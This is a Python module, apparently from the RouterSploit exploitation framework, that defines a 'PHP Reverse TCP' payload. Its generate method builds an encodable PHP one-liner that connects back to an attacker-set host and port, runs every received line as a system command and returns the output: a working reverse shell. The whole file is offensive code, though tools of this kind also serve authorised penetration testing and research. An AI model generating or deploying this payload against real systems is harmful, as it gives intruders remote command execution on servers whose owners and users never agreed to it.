from routersploit.core.exploit.option import OptEncoder
from routersploit.core.exploit.payloads import (
    GenericPayload,
    Architectures,
    ReverseTCPPayloadMixin,
)
from routersploit.modules.encoders.php.base64 import Encoder


class Payload(ReverseTCPPayloadMixin, GenericPayload):
    __info__ = {
        "name": "PHP Reverse TCP",
        "description": "Creates interactive tcp reverse shell by using php.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
    }

    architecture = Architectures.PHP
    encoder = OptEncoder(Encoder(), "Encoder")

    def generate(self):
        return (
            "$s=fsockopen(\"tcp://{}\",{});".format(self.lhost, self.lport) +
            "while(!feof($s)){exec(fgets($s),$o);$o=implode(\"\\n\",$o);$o.=\"\\n\";fputs($s,$o);}"
        )
